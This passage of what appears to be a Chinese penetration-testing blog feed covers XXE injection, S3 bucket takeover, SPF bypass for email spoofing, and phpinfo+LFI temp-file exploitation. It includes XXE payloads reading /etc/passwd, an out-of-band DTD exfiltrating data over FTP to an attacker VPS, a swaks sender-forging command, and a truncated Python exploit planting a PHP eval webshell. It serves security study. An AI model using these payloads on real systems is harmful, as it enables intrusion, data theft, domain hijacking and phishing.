test &quot;test&quot;&#39;&gt;</span><br><span class="line">%local_dtd;</span><br></pre></td></tr></table></figure><p><strong>Citrix XenMobile Server</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % local_dtd SYSTEM &quot;jar:file:&#x2F;&#x2F;&#x2F;opt&#x2F;sas&#x2F;sw&#x2F;tomcat&#x2F;shared&#x2F;lib&#x2F;jsp-api.jar!&#x2F;javax&#x2F;servlet&#x2F;jsp&#x2F;resources&#x2F;jspxml.dtd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % Body &#39;&gt;Your DTD code&lt;!ENTITY test &quot;test&quot;&#39;&gt;</span><br><span class="line">%local_dtd;</span><br></pre></td></tr></table></figure><p><strong>Custom Multi-Platform IBM WebSphere Application</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % local_dtd SYSTEM &quot;.&#x2F;..&#x2F;..&#x2F;properties&#x2F;schemas&#x2F;j2ee&#x2F;XMLSchema.dtd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % xs-datatypes &#39;Your DTD code&#39;&gt;</span><br><span class="line">&lt;!ENTITY % simpleType &quot;a&quot;&gt;</span><br><span class="line">&lt;!ENTITY % restriction &quot;b&quot;&gt;</span><br><span class="line">&lt;!ENTITY % boolean &quot;(c)&quot;&gt;</span><br><span class="line">&lt;!ENTITY % URIref &quot;CDATA&quot;&gt;</span><br><span class="line">&lt;!ENTITY % XPathExpr &quot;CDATA&quot;&gt;</span><br><span class="line">&lt;!ENTITY % QName &quot;NMTOKEN&quot;&gt;</span><br><span class="line">&lt;!ENTITY % NCName &quot;NMTOKEN&quot;&gt;</span><br><span class="line">&lt;!ENTITY % nonNegativeInteger &quot;NMTOKEN&quot;&gt;</span><br><span class="line">%local_dtd;</span><br></pre></td></tr></table></figure><h2 id="4-soap接口攻击"><a href="#4-soap接口攻击" class="headerlink" title="4. soap接口攻击"></a>4. soap接口攻击</h2><p>在前端获取到参数后，后端接口直接放入xml中，对后台的soap接口进行请求。这种情况需要挨着测试参数，添加如下payload</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">foo</span> <span class="attr">xmlns:xi</span>=<span class="string">&quot;http://www.w3.org/2001/XInclude&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xi:include</span> <span class="attr">parse</span>=<span class="string">&quot;text&quot;</span> <span class="attr">href</span>=<span class="string">&quot;file:///etc/passwd&quot;</span>/&gt;</span><span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/2021/03/09/xxe%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20210309123241787.png" alt="image-20210309123241787"></p><h2 id="5-svg上传"><a href="#5-svg上传" class="headerlink" title="5. svg上传"></a>5. svg上传</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; standalone=&quot;yes&quot;?&gt;</span><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">test</span> [ <span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///etc/hostname&quot;</span> &gt;</span> ]&gt;</span><span class="tag">&lt;<span class="name">svg</span> <span class="attr">width</span>=<span class="string">&quot;128px&quot;</span> <span class="attr">height</span>=<span class="string">&quot;128px&quot;</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/2000/svg&quot;</span> <span class="attr">xmlns:xlink</span>=<span class="string">&quot;http://www.w3.org/1999/xlink&quot;</span> <span class="attr">version</span>=<span class="string">&quot;1.1&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">text</span> <span class="attr">font-size</span>=<span class="string">&quot;16&quot;</span> <span class="attr">x</span>=<span class="string">&quot;0&quot;</span> <span class="attr">y</span>=<span class="string">&quot;16&quot;</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">text</span>&gt;</span><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="6-利用ftp协议列目录"><a href="#6-利用ftp协议列目录" class="headerlink" title="6. 利用ftp协议列目录"></a>6. 利用ftp协议列目录</h2><p>使用ruby编写ftp服务端</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">&#x27;socket&#x27;</span></span><br><span class="line">server = TCPServer.new <span class="number">3333</span></span><br><span class="line">loop <span class="keyword">do</span></span><br><span class="line">  Thread.start(server.accept) <span class="keyword">do</span> <span class="params">|client|</span></span><br><span class="line">    puts <span class="string">&quot;New client connected&quot;</span></span><br><span class="line">    data = <span class="string">&quot;&quot;</span></span><br><span class="line">    client.puts(<span class="string">&quot;220 xxe-ftp-server&quot;</span>)</span><br><span class="line">    loop &#123;</span><br><span class="line">        req = client.gets()</span><br><span class="line">        puts <span class="string">&quot;&lt; &quot;</span>+req</span><br><span class="line">        <span class="keyword">if</span> req.<span class="keyword">include</span>? <span class="string">&quot;USER&quot;</span></span><br><span class="line">            client.puts(<span class="string">&quot;331 password please - version check&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">           <span class="comment">#puts &quot;&gt; 230 more data please!&quot;</span></span><br><span class="line">            client.puts(<span class="string">&quot;230 more data please!&quot;</span>)</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><p>然后在dtd文件中，使用ftp进行登录，在ftp密码字段插入目录，能够通过ftp换行输出所有目录</p><p>dtd文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;&quot;&gt;</span><br><span class="line">&lt;!ENTITY % eval &quot;&lt;!ENTITY &amp;#x25; exfiltrate SYSTEM &#39;ftp:&#x2F;&#x2F;test:%file;@vps:3333&#39;&gt;&quot;&gt;</span><br><span class="line">%eval;</span><br><span class="line">%exfiltrate;</span><br></pre></td></tr></table></figure><p>在burp中加载攻击的dtd文件</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">foo</span> [<span class="meta">&lt;!ENTITY % <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">&quot;http://vps/test.dtd&quot;</span>&gt;</span> %xxe;]&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/2021/03/09/xxe%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20210310161841633.png" alt="image-20210310161841633"></p><h2 id="7-jar协议"><a href="#7-jar协议" class="headerlink" title="7. jar协议"></a>7. jar协议</h2><h1 id="参考文档"><a href="#参考文档" class="headerlink" title="参考文档"></a>参考文档</h1><ol><li><a href="https://portswigger.net/web-security/xxe">XML external entity (XXE) injection</a></li><li><a href="https://portswigger.net/web-security/xxe/blind">Finding and exploiting blind XXE vulnerabilities</a></li><li><a href="https://xz.aliyun.com/t/3357">一篇文章带你深入理解漏洞之 XXE 漏洞</a></li><li><a href="https://xz.aliyun.com/t/4059">绕过WAF保护的XXE</a></li><li><a href="https://hundan.org/2019-11-13-%E4%BD%BF%E7%94%A8%E6%9C%AC%E5%9C%B0DTD%E6%96%87%E4%BB%B6%E8%BF%9B%E8%A1%8CXXE%E6%94%BB%E5%87%BB.html">使用本地DTD文件进行XXE攻击</a></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x01-DTD基础知识&quot;&gt;&lt;a href=&quot;#0x01-DTD基础知识&quot; class=&quot;headerlink&quot; title=&quot;0x01 DTD基础知识&quot;&gt;&lt;/a&gt;0x01 DTD基础知识&lt;/h1&gt;&lt;p&gt;&lt;code&gt;DTD&lt;/code&gt;全称document typ</summary>
      
    
    
    
    <category term="Pentest" scheme="http://blog.le31ei.top/categories/Pentest/"/>
    
    
    <category term="xxe" scheme="http://blog.le31ei.top/tags/xxe/"/>
    
  </entry>
  
  <entry>
    <title>amazon S3 Bucket takeover</title>
    <link href="http://blog.le31ei.top/2021/03/04/amazon-S3-Bucket-takeover/"/>
    <id>http://blog.le31ei.top/2021/03/04/amazon-S3-Bucket-takeover/</id>
    <published>2021-03-04T02:18:24.000Z</published>
    <updated>2021-03-04T02:18:24.929Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x01-原理"><a href="#0x01-原理" class="headerlink" title="0x01 原理"></a>0x01 原理</h1><p>亚马逊S3对象存储，可以存放文件、图形等资源。通过api进行读写操作。近几年的网站开发存储资源文件如头像、上传文件等都基本开始采用对象存储的方式进行。</p><p>阿里云的对象存储对应简称为OSS，腾讯云的对象存储为COS。在使用对象存储时，首先会创建一个存储桶（bucket），在对应的存储桶中可以上传文件、创建文件夹等操作。同时还具备对应的权限管理。一般在开发过程中，创建好存储桶后，使用api接口对存储桶进行相关的操作。</p><p>生成新的存储桶时，系统会默认创建一个域名，类似于<code>http://bscw-web-admin-prod.s3-website.us-east-2.amazonaws.com</code>和<code>https://coding-pages-bucket.cos-website.ap-hongkong.myqcloud.com</code>，域名规则为子域为桶名称，然后加上对象存储的简称，然后加上地域的名字。例如，<code>coding-pages-bucket</code>是桶的名称，<code>cos-website</code>是对象存储的名称，<code>ap-hongkong</code>为对象存储所在的区域。</p><p>一般情况下，会配置一个CNAME的域名映射，将自己的域名映射到存储桶默认分配的域名，这样存储桶就能通过静态页面对资源进行展示了。</p><p>根据以上原理描述，可以对对象存储进行劫持，原理可以按照如下理解</p><blockquote><ol><li>在存储桶不再使用后，一般厂家会删除对应的存储桶，因为云存储是要收费的，但是域名对应存储桶域名的映射一般不会删除</li><li>所以在访问域名时候，会提示404，并且显示<code>NoSuchBucket</code></li><li>这时候域名访问的则是对存储桶映射的域名的访问。劫持时，则是在对应的云存储厂商上面注册一样存储桶，那么则可以劫持对应的域名了。</li><li>注册存储桶一共有两个要点，一是注册同样名字的存储桶，二是注册同一个地域的存储桶，目的就是保持生成的存储桶域名一致</li></ol></blockquote><p><img src="/2021/03/04/amazon-S3-Bucket-takeover/image-20210302162047983.png" alt="image-20210302162047983"></p><h1 id="0x02-实战S3劫持"><a href="#0x02-实战S3劫持" class="headerlink" title="0x02 实战S3劫持"></a>0x02 实战S3劫持</h1><h2 id="1-搜索"><a href="#1-搜索" class="headerlink" title="1. 搜索"></a>1. 搜索</h2><p>可以通过fofa进行搜索，语法是<code>body=&quot;BucketName&quot;</code>，搜索结果404的页面基本为废弃的存储桶。</p><p><img src="/2021/03/04/amazon-S3-Bucket-takeover/image-20210302164142709.png" alt="image-20210302164142709"></p><h2 id="2-注册存储桶并劫持"><a href="#2-注册存储桶并劫持" class="headerlink" title="2. 注册存储桶并劫持"></a>2. 注册存储桶并劫持</h2><p>根据搜索结果得到<code>BucketName</code></p><p><img src="/2021/03/04/amazon-S3-Bucket-takeover/image-20210304095504174.png" alt="image-20210304095504174"></p><p>如果搜索出来的域名不为amazon自动分配的带有区域的域名，则需要通过域名查询CNAME的的映射，需要得到相关的区域。</p><p>创建存储桶时，输入对应的桶名称，选择对应的区域</p><p><img src="/2021/03/04/amazon-S3-Bucket-takeover/image-20210304100111218.png" alt="image-20210304100111218"></p><p>将阻止公开访问的勾去掉，确保能够公开访问</p><p><img src="/2021/03/04/amazon-S3-Bucket-takeover/image-20210304100143369.png" alt="image-20210304100143369"></p><p><img src="/2021/03/04/amazon-S3-Bucket-takeover/image-20210304100206795.png" alt="image-20210304100206795"></p><p>在该存储桶内上传对应的文件，一般传入index.html</p><p><img src="/2021/03/04/amazon-S3-Bucket-takeover/image-20210304100302844.png" alt="image-20210304100302844"></p><p>此时访问对应的域名，已经显示AccessDenied了，证明已经生效了。但是由于访问权限问题，导致在公开访问时，会显示访问拒绝，后面仅需要设置对应的权限即可。</p><p><img src="/2021/03/04/amazon-S3-Bucket-takeover/image-20210304100356886.png" alt="image-20210304100356886"></p><p>在对应文件（index.html）的<code>访问控制列表(ACL)</code>中，将访问权限打开</p><p><img src="/2021/03/04/amazon-S3-Bucket-takeover/image-20210304100911928.png" alt="image-20210304100911928"></p><p>最后一步，因为是静态网站，需要在存储桶属性里面将静态网站托管的权限打开</p><p><img src="/2021/03/04/amazon-S3-Bucket-takeover/image-20210304101017134.png" alt="image-20210304101017134"></p><p><img src="/2021/03/04/amazon-S3-Bucket-takeover/image-20210304101706843.png" alt="image-20210304101706843"></p><p>最后即可劫持成功</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ol><li><a href="https://blog.securelayer7.net/aws-penetration-testing-for-s3-bucket-service-basics-security/">https://blog.securelayer7.net/aws-penetration-testing-for-s3-bucket-service-basics-security/</a></li><li><a href="https://blog.securelayer7.net/hands-on-aws-s3-bucket-account-takeover-vulnerability/">https://blog.securelayer7.net/hands-on-aws-s3-bucket-account-takeover-vulnerability/</a></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x01-原理&quot;&gt;&lt;a href=&quot;#0x01-原理&quot; class=&quot;headerlink&quot; title=&quot;0x01 原理&quot;&gt;&lt;/a&gt;0x01 原理&lt;/h1&gt;&lt;p&gt;亚马逊S3对象存储，可以存放文件、图形等资源。通过api进行读写操作。近几年的网站开发存储资源文件如</summary>
      
    
    
    
    <category term="Pentest" scheme="http://blog.le31ei.top/categories/Pentest/"/>
    
    
    <category term="takeover" scheme="http://blog.le31ei.top/tags/takeover/"/>
    
  </entry>
  
  <entry>
    <title>spf与邮件伪造</title>
    <link href="http://blog.le31ei.top/2021/02/24/spf%E4%B8%8E%E9%82%AE%E4%BB%B6%E4%BC%AA%E9%80%A0/"/>
    <id>http://blog.le31ei.top/2021/02/24/spf%E4%B8%8E%E9%82%AE%E4%BB%B6%E4%BC%AA%E9%80%A0/</id>
    <published>2021-02-24T08:22:41.000Z</published>
    <updated>2021-02-24T08:22:41.032Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x01-SPF"><a href="#0x01-SPF" class="headerlink" title="0x01 SPF"></a>0x01 SPF</h1><p>SPF，全称为 Sender Policy Framework，即发件人策略框架。目前基本上市面正在使用的邮箱产品均对SPF进行了校验。</p><p><strong>原理：</strong></p><p>SPF是一个DNS的TXT记录，定义了收到的邮件允许发送的ip范围。</p><p>例如使用<code>swaks</code>伪造邮件发送<code>swaks -t test@qq.com -f admin@qq.com</code>。该命令表示从<code>admin@qq.com</code>发送邮件到<code>test@qq.com</code>。qq邮箱在收到邮件后，会对<code>qq.com</code>的SPF记录进行校验，判断发送客户端的ip地址是否在SPF记录所包含的范围内。如图显示SPF校验失败。</p><p><img src="/2021/02/24/spf%E4%B8%8E%E9%82%AE%E4%BB%B6%E4%BC%AA%E9%80%A0/image-20210223162316539.png" alt="image-20210223162316539"></p><p>查询SPF的方法很简单，使用如下命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">nslookup -type=txt qq.com</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> output</span></span><br><span class="line">Server:        61.139.2.69</span><br><span class="line">Address:    61.139.2.69#53</span><br><span class="line"></span><br><span class="line">Non-authoritative answer:</span><br><span class="line">qq.com    text = &quot;v=spf1 include:spf.mail.qq.com -all&quot;</span><br><span class="line"></span><br><span class="line">Authoritative answers can be found from:</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>SPF语法比较简单</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v=spf1 include:spf.mail.qq.com -all</span><br></pre></td></tr></table></figure><ol><li>v=spf1固定格式，目前spf只有第一版</li><li>include:spf.mail.qq.com表示引入spf.mail.qq.com的SPF记录，继续递归查询spf.mail.qq.com的记录</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">➜ nslookup -type=txt spf.mail.qq.com</span><br><span class="line">Server:        61.139.2.69</span><br><span class="line">Address:    61.139.2.69#53</span><br><span class="line"></span><br><span class="line">Non-authoritative answer:</span><br><span class="line">spf.mail.qq.com    text = &quot;v=spf1 include:spf-a.mail.qq.com include:spf-b.mail.qq.com include:spf-c.mail.qq.com include:spf-d.mail.qq.com include:spf-e.mail.qq.com include:spf-f.mail.qq.com include:spf-g.mail.qq.com -all&quot;</span><br><span class="line"></span><br><span class="line">Authoritative answers can be found from:</span><br><span class="line"></span><br><span class="line">➜  ~ nslookup -type=txt spf-a.mail.qq.com</span><br><span class="line">Server:        61.139.2.69</span><br><span class="line">Address:    61.139.2.69#53</span><br><span class="line"></span><br><span class="line">Non-authoritative answer:</span><br><span class="line">spf-a.mail.qq.com    text = &quot;v=spf1 ip4:203.205.251.0/24 ip4:103.7.29.0/24 ip4:59.36.129.0/24 ip4:113.108.23.0/24 ip4:113.108.11.0/24 ip4:119.147.193.0/24 ip4:119.147.194.0/24 ip4:59.78.209.0/24 ip4:113.96.223.0/24 ip4:183.3.226.0/24 ip4:183.3.255.0/24 ip4:59.36.132.0/24 -all&quot;</span><br><span class="line"></span><br><span class="line">Authoritative answers can be found from:</span><br></pre></td></tr></table></figure><ol start="3"><li>-all表示拒绝所有，spf记录从左到右依次执行，允许后，其余所有拒绝</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&quot;+&quot;  Pass（通过）</span><br><span class="line">&quot;-&quot;  Fail（拒绝）</span><br><span class="line">&quot;~&quot;  Soft Fail（软拒绝）邮件将会被放入垃圾箱或做其他标记</span><br><span class="line">&quot;?&quot;  Neutral（中立）</span><br></pre></td></tr></table></figure><h1 id="0x02-邮件伪造"><a href="#0x02-邮件伪造" class="headerlink" title="0x02 邮件伪造"></a>0x02 邮件伪造</h1><p>市面上所有的邮箱平台均对SPF有相关校验，所以邮件伪造的关键点就是对SPF的绕过。</p><p>要绕过SPF除了相关的SPF记录配置错误之外，就只能通过SMTP代发的方式，伪造显示的邮件发件人来进行伪造。</p><p>具体使用如下命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">swaks --body &quot;test&quot; --header &quot;Subject:test&quot; --h-From: &#x27;test&lt;admin@qq.com&gt;&#x27; -f admin@le31ei.top -t le31ei@163.com --server smtp.mxhichina.com -au xxx -ap xxx -p 25 --header-X-Mailer 163.com --ehlo 163.com</span><br></pre></td></tr></table></figure><p><code>--header-X-Mailer</code>是为了伪造smtp中的X-Mailer参数，默认带有工具的相关参数，<strong>qq邮箱会直接放入垃圾箱</strong></p><p><img src="/2021/02/24/spf%E4%B8%8E%E9%82%AE%E4%BB%B6%E4%BC%AA%E9%80%A0/image-20210223165505391.png" alt="image-20210223165505391"></p><p>以上的方式对于gmail已经无效了，邮件不会显示在收件箱中。但QQ邮箱能正常接收，但是会提示由谁代发</p><p><img src="/2021/02/24/spf%E4%B8%8E%E9%82%AE%E4%BB%B6%E4%BC%AA%E9%80%A0/image-20210223165626191.png" alt="image-20210223165626191"></p><p>对于163邮箱，默认没有任何防护措施。</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ol><li><a href="https://bbs.ichunqiu.com/thread-55388-1-1.html">关于邮件伪造的一些新思路</a></li><li><a href="https://www.cnblogs.com/xiaozi/p/12906040.html">邮件伪造之SPF绕过的5种思路</a></li><li><a href="http://www.renfei.org/blog/introduction-to-spf.html">SPF 记录：原理、语法及配置方法简介</a></li><li><a href="https://help.aliyun.com/knowledge_detail/36771.html">邮箱域名的spf记录添加方法</a></li><li><a href="https://www.kitterman.com/spf/validate.html">SPF Record Testing Tools</a></li><li><a href="https://www.anquanke.com/post/id/218889">邮件伪造组合拳</a></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x01-SPF&quot;&gt;&lt;a href=&quot;#0x01-SPF&quot; class=&quot;headerlink&quot; title=&quot;0x01 SPF&quot;&gt;&lt;/a&gt;0x01 SPF&lt;/h1&gt;&lt;p&gt;SPF，全称为 Sender Policy Framework，即发件人策略框架。目前基本上</summary>
      
    
    
    
    <category term="RedTeam" scheme="http://blog.le31ei.top/categories/RedTeam/"/>
    
    
    <category term="邮件伪造" scheme="http://blog.le31ei.top/tags/%E9%82%AE%E4%BB%B6%E4%BC%AA%E9%80%A0/"/>
    
  </entry>
  
  <entry>
    <title>php临时文件</title>
    <link href="http://blog.le31ei.top/2021/02/22/php%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6/"/>
    <id>http://blog.le31ei.top/2021/02/22/php%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6/</id>
    <published>2021-02-22T06:19:55.000Z</published>
    <updated>2021-02-22T06:19:55.286Z</updated>
    
    <content type="html"><![CDATA[<p>本来打算研究下phpinfo+本地包含导致命令执行的利用方法，深入研究原理后发现是php临时文件机制的问题，故记录下学习过程。</p><h1 id="0x01-phpinfo-LFI"><a href="#0x01-phpinfo-LFI" class="headerlink" title="0x01 phpinfo+LFI"></a>0x01 phpinfo+LFI</h1><p>该方法的利用原理其实很简单，利用的是php在上传的时候会生成临时文件。会在临时的存储目录生成名为：<code>php**.tmp</code>的临时文件，而该文件内容就是上传的内容，并且该文件路径会显示在phpinfo的tmp_dir路径当中。</p><p>在存在本地包含漏洞的时候，可以直接通过读取phpinfo中的该配置项，直接去包含临时文件，执行临时文件中的代码。</p><p>如果临时文件是一个写文件的脚本，那么直接就可以通过竞争条件的方式在临时文件被删除之前，生成新的shell文件。</p><p>具体利用代码如下：</p><p>在使用时，需要修改包含文件的路径，写文件的位置，等参数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PAYLOAD=<span class="string">&quot;&quot;&quot;&lt;?php file_put_contents(&#x27;/tmp/eval&#x27;, &#x27;&lt;?=eval($_REQUEST[1])?&gt;&#x27;)?&gt;\r&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">UPLOAD=<span class="string">&quot;&quot;&quot;-----------------------------7dbff1ded0714\r</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name=&quot;dummyname&quot;; filename=&quot;test.txt&quot;\r</span></span><br><span class="line"><span class="string">Content-Type: text/plain\r</span></span><br><span class="line"><span class="string">\r</span></span><br><span class="line"><span class="string">&#123;&#125;</span></span><br><span class="line"><span class="string">-----------------------------7dbff1ded0714--\r&quot;&quot;&quot;</span>.<span class="built_in">format</span>(PAYLOAD)</span><br><span class="line"></span><br><span class="line">padding=<span class="string">&quot;A&quot;</span> * <span class="number">5000</span></span><br><span class="line"></span><br><span class="line">INFOREQ=<span class="string">&quot;&quot;&quot;POST /phpinfo.php?a=&#123;padding&#125; HTTP/1.1\r</span></span><br><span class="line"><span class="string">Cookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie=&#123;padding&#125;\r</span></span><br><span class="line"><span class="string">HTTP_ACCEPT: &#123;padding&#125;\r</span></span><br><span class="line"><span class="string">HTTP_USER_AGENT: &#123;padding&#125;\r</span></span><br><span class="line"><span class="string">HTTP_ACCEPT_LANGUAGE: &#123;padding&#125;\r</span></span><br><span class="line"><span class="string">HTTP_PRAGMA: &#123;padding&#125;\r</span></span><br><span class="line"><span class="string">Content-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\r</span></span><br><span class="line"><span class="string">Content-Length: &#123;len&#125;\r</span></span><br><span class="line"><span class="string">Host: %s\r</span></span><br><span class="line"><span class="string">\r</span></span><br><span class="line"><span class="string">&#123;upload&#125;&quot;&quot;&quot;</span>.<span class="built_in">format</span>(padding=padding, <span class="built_in">len</span>=<span class="built_in">len</span>(UPLOAD), upload=UPLOAD)</span><br><span class="line"></span><br><span class="line">LFIREQ=<span class="string">&quot;&quot;&quot;GET /lfi.php?file=%s HTTP/1.1\r</span></span><br><span class="line"><span class="string">User-Agent: Mozilla/4.0\r</span></span><br><span class="line"><span class="string">Proxy-Connection: Keep-Alive\r</span></span><br><span class="line"><span class="string">Host: %s\r</span></span><br><span class="line"><span class="string">\r</span></span><br><span class="line"><span class="string">\r</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PHPINFO_LFI</span>():</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, host, port</span>):</span></span><br><span class="line">        self.host = host</span><br><span class="line">        self.port = <span class="built_in">int</span>(port)</span><br><span class="line">        self.req_payload= (INFOREQ % self.host).encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        self.lfireq = LFIREQ</span><br><span class="line">        self.offset = self.get_offfset()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span 